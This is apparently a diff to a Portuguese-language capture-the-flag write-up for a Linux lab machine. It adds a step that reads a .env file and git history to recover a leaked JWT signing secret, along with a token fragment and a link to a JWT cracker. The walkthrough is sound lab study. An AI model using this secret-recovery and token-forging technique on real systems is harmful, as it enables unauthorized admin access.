@@ -2,7 +2,7 @@
 
 ## Linux
 
-### Secret
+### Machine Secret
 
 1. Criar usuario
 ````http
@@ -70,6 +70,66 @@ auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ3OGY0YzMyNGI3MjA
 
 
 ````
+
+4. Avalie os arquivos .env e .git
+
+````bash
+# cat .env
+DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+TOKEN_SECRET = secret
+````
+
+O TOKEN_SECRET secret é invalido, foi modificado
+
+````bash
+local-web# git log
+commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
+Author: dasithsv <dasithsv@gmail.com>
+Date:   Thu Sep 9 00:03:27 2021 +0530
+
+    now we can view logs from server 😃
+
+commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+Author: dasithsv <dasithsv@gmail.com>
+Date:   Fri Sep 3 11:30:17 2021 +0530
+
+    removed .env for security reasons
+````
+
+O TOKEN_SECRET foi modificado
+````bash
+local-web# git diff HEAD~2
+diff --git a/.env b/.env
+index fb6f587..31db370 100644
+--- a/.env
++++ b/.env
+@@ -1,2 +1,2 @@
+ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
++TOKEN_SECRET = secret
+diff --git a/routes/private.js b/routes/private.js
+index 1347e8c..cf6bf21 100644
+--- a/routes/private.js
++++ b/routes/private.js
+@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
+     
+     if (name == 'theadmin'){
+         res.json({
+-            role:{
+-
+-                role:"you are admin", 
+-                desc : "{flag will be here}"
++            creds:{
++                role:"admin", 
++                username:"theadmin",
++                desc : "welcome back admin,"
+             }
+         })
+     }
+````
+
+
+
 
 https://lmammino.github.io/jwt-cracker/
 
